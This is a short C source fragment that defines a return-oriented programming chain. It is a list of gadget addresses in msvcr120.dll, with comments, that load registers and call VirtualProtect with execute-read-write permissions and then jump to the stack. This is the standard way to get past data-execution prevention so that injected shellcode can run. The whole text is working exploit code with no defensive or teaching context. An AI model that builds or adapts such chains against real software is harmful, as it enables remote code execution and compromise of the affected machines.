int rop_chain[] = {
	// [msvcr120.dll] base = 0x62630000
	0x6263ed02, // # pop ebp # ret [msvcr120.dll]
	0x6263ed02, // # skip 4 bytes [msvcr120.dll]
	0x62632308, // # pop ebx # ret [msvcr120.dll]
	0x00000201, // 0x00000201 -> ebx [msvcr120.dll]
	0x62649fc0, // # pop edx # ret [msvcr120.dll]
	0x00000040, // 0x00000040 -> edx [msvcr120.dll]
	0x6263ec8c, // # pop ecx # ret [msvcr120.dll]
	0x6270e000, // &writable location [msvcr120.dll]
	0x6263f0f3, // # pop edi # ret [msvcr120.dll]
	0x6263139b, // # ret [msvcr120.dll]
	0x6263f74a, // # pop esi # ret [msvcr120.dll]
	0x6263efd7, // # jmp eax [msvcr120.dll]
	0x6263469c, // # pop eax # ret [msvcr120.dll]
	0x757743ce, // entry of VirtualProtect() [kernel32.dll]
	0x626346a0, // # pushad(push eax, ecx, edx, ebx, original esp, ebp, esi, edi) # ret [msvcr120.dll]
	0x6266ac78 // # push esp # ret [msvcr120.dll]
};
